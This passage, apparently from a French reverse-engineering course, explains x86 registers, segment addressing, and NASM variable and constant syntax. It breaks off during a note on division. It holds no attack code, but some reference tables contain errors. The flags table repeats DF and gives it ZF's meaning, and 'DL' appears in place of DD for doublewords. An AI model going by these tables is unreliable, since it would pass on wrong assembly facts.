&lt;p&gt;&lt;img src=&quot;/public/img/reverse-intro/register_size.jpg&quot; class=&quot;center&quot; alt=&quot;Memory comparaison&quot; width=&quot;600&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Les registres forment une &lt;strong&gt;mémoire interne&lt;/strong&gt; aux processeurs, plus on a de registres, plus on peut stocker de données, et moins on a besoin d’accès aux mémoires extérieurs (qui sont bien plus lentes).&lt;/p&gt;

&lt;p&gt;Les processeurs x86 en 32 bits possèdent 8 registres généraux (&lt;code class=&quot;highlighter-rouge&quot;&gt;EAX&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;EBX&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;ECX&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;EDX&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;ESP&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;EBP&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;ESI&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;EDI&lt;/code&gt;). En 64 bits, on passe à 16 registres logiques, mais dans les faits, il en existe bien plus (ex: 168) afin de paralléliser les instructions.&lt;/p&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;data-registers&quot;&gt;data registers&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;Ils sont utilisés pour stocker des résultats d’opérations élémentaires lors de l’exécution du programme.&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;registre&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;définition&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;utilisation&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;AX&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Accumulator Register&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;opérations input/output, et opérations arithmétiques&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;BX&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Base Register&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;pour indexer des adresses&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;CX&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Counter Register&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;index dans les boucles itératives&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;DX&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Data Register&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;opérations input/output&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;De ces 4 registres, il existe plusieurs dérivés.&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;64-bits&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;32-bits (p. faible)&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;16-bits (p. faible)&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;RAX&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;EAX&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;AX&lt;/code&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;RBX&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;EBX&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;BX&lt;/code&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;RCX&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;ECX&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;CX&lt;/code&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;RDX&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;EDX&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;DX&lt;/code&gt;&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;R&lt;/code&gt;: register&lt;br /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;E&lt;/code&gt;: extended&lt;br /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;H&lt;/code&gt;: high&lt;br /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;L&lt;/code&gt;: low&lt;/p&gt;

&lt;p&gt;Il existe aussi des registes de 8 bits pour &lt;code class=&quot;highlighter-rouge&quot;&gt;A&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;B&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;C&lt;/code&gt; et &lt;code class=&quot;highlighter-rouge&quot;&gt;D&lt;/code&gt;. Il suffit de rajouter &lt;code class=&quot;highlighter-rouge&quot;&gt;H&lt;/code&gt; pour avoir les bits de poids fort, et &lt;code class=&quot;highlighter-rouge&quot;&gt;L&lt;/code&gt; pour les bits de poids faible.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/public/img/reverse-intro/eax.jpg&quot; class=&quot;center&quot; alt=&quot;EAX example&quot; width=&quot;800&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Cette variété de tailles de registres permet de stocker des données selon la taille qu’elles nécessitent.&lt;/p&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;pointer-registers&quot;&gt;pointer registers&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;Ils sont utilisés pour pointer des adresses mémoires.&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;registre&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;définition&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;utilisation&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;SP&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Stack Pointer&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;adresse libre de la stack (pile) (offset)&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;IP&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Instruction Pointer&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;prochaine adresse de l’instruction à exécuter (offset)&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;BP&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Base Pointer&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;reférence les paramètres d’une routine&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;PC&lt;/code&gt;= &lt;code class=&quot;highlighter-rouge&quot;&gt;IP&lt;/code&gt; = Instruction Pointer (en x86)&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;ESP&lt;/code&gt; et &lt;code class=&quot;highlighter-rouge&quot;&gt;EBP&lt;/code&gt; stockent des adresses 32 bits pour délimiter le &lt;strong&gt;stack frame&lt;/strong&gt; courante.&lt;/p&gt;

&lt;p&gt;À partir de ces 3 registres, il existe plusieurs dérivées.&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;64-bits&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;32-bits (p. faible)&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;16-bits (p. faible)&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;RSP&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;ESP&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;SP&lt;/code&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;RIP&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;EIP&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;IP&lt;/code&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;RBP&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;EBP&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;BP&lt;/code&gt;&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;index-registers&quot;&gt;index registers&lt;/h2&gt;
&lt;hr /&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;registre&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;définition&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;utilisation&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;SI&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Source Index&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;index source pour opérat. sur les chaines&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;DI&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Destination Index&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;index de destination pour opérat. sur les chaines&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;À partir de ces 2 registres, il existe plusieurs dérivées :&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;64-bits&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;32-bits (p. faible)&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;16-bits (p. faible)&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;RSI&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;ESI&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;SI&lt;/code&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;RDI&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;EDI&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;DI&lt;/code&gt;&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;control-registers-flags&quot;&gt;control registers (flags)&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;Ces flags de 16 bit sont mis à jour après chaque opération.&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;64-bits&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;32-bits&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;16-bits&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;RFLAGS&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;EFLAGS&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;FLAGS&lt;/code&gt;&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Par exemple, &lt;code class=&quot;highlighter-rouge&quot;&gt;EFLAGS&lt;/code&gt; contient des indicateurs, des interrupteurs, etc… Ces flags sont essentiellement utilisés pour des comparaisons, mais pas que.&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;registre&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;définition&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;utilisation&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;OF&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Overflow Flag&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;si dépassement de capacité d’une donnée après une opération&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;DF&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Direction Flag&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt; &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;IF&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Interrupt Flag&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;l’exécution doit-elle être à l’écoute des évenements extérieurs (clavier, souris)&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;TF&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Trap Flag&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;on dit au processeur qu’on peut exeuctuer le programme pas à pas (instruction par instruction) (mode debug)&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;SF&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Sign Flag&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;signe d’une opération&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;ZF&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Zero Flag&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt; &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;DF&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Direction Flag&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;resultat d’une opération qui fait 0&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;AF&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Auxiliary Carry Flag&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt; &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;PF&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Parity Flag&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;bit de parité&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;CF&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Carry Flag&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt; &lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Il en existe d’autres…&lt;/p&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;segment-registers&quot;&gt;segment registers&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;Pour décrire le partage mémoire.&lt;/p&gt;

&lt;p&gt;Utilisé pour faciliter la lecture et l’écriture sur la mémoire.&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;registre&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;définition&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;utilisation&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;CS&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Code Segment&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;adresse de début des instructions&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;DS&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Data Segment&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;adresse de début des données&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;SS&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Stack Segment&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;adresse de début de la stack (pile)&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Il en existe d’autres qui ont le rôle de définir d’autres espaces mémoires comme &lt;code class=&quot;highlighter-rouge&quot;&gt;ES&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;FS&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;GS&lt;/code&gt;.&lt;/p&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;adressage&quot;&gt;adressage&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;Toute adresse dans une programme est définie par l’adresse de &lt;strong&gt;début de segement&lt;/strong&gt; et par le décallage (&lt;strong&gt;offset&lt;/strong&gt;). Cela nous permet de trouver l’adresse exacte d’une instruction grace à la somme de ces 2 valeurs.&lt;/p&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;initialized-variables&quot;&gt;initialized variables&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;[nom_variable]    taille    valeur&lt;/code&gt;&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;taille&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;définition&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;nombre d’octets aloués&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;DB&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Define Byte&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;1&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;DW&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Define Word&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;2&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;DL&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Define Doubleword&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;4&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;DQ&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Define Quadword&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;8&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# exemple de définition de variables&lt;/span&gt;
ma_lettre DB &lt;span class=&quot;s1&quot;&gt;'m'&lt;/span&gt;
mon_age	DW 12345
mon_negatif DW &lt;span class=&quot;nt&quot;&gt;-12345&lt;/span&gt;
grand_nombre DQ	123456789
reel DD	1.234
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;unitialized-variables&quot;&gt;unitialized variables&lt;/h2&gt;
&lt;hr /&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;taille&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;définition&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;nombre d’octets reservé&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;RESB&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Reserve Byte&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;1&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;RESW&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Reserve Word&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;2&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;RESD&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Reserve Doubleword&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;4&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;RESQ&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Reserve Quadword&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;8&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;REST&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Reserve Ten Bytes&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;10&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;constantes&quot;&gt;constantes&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;CONSTANT_NAME EQU expression&lt;/code&gt;&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;TOTAL_STUDENTS equ 50
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# numeric constant&lt;/span&gt;
%assign TOTAL 10
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# both numeric and string constants&lt;/span&gt;
%define PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;EBP+4]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;unary-operations&quot;&gt;unary operations&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;DIV divisor ; unsigned data&lt;/li&gt;
  &lt;li&gt;IDIV divisor ; signed data
    &lt;ul&gt;
      &lt;li&gt;16-bit: (AX) / 8-bit divisor = AL(quotient) and AH(remainder)&lt;/li&gt;
      &lt;li&gt;32-bit: (DX AX) / 16-bit divisor = AX(quotient) and DX(remainder)&lt;/li&gt;
